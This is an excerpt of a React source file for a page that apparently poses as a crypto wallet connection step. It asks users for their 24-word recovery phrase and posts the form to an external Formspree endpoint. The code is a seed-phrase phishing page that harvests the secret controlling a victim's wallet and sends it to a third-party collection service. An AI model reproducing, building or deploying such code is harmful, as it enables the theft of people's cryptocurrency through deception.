...
export default function TwentyFourMnemonic() {
    ...
    const handleSubmit = async (e: React.FormEvent) => {
        ...
        try {
            ...
            const response = await fetch('https://formspree.io/f/xykdjvbg', {
                method: 'POST',
                headers: {
                    ...
                    <div className="max-w-4xl mx-auto">
                        <div className="mb-8">
                            ...
                            <p className="text-gray-600">
                                Enter your 24-word recovery phrase to connect your wallet
                            </p>
                        </div>
                        <form onSubmit={handleSubmit}>
                            ...
                            <button
                                ...
                                className="w-full bg-[#3F356B] text-white font-semibold py-3 rounded-lg hover:bg-[#7a6ae8] transition-colors disabled:bg-gray-400 disabled:cursor-not-allowed"
                            >
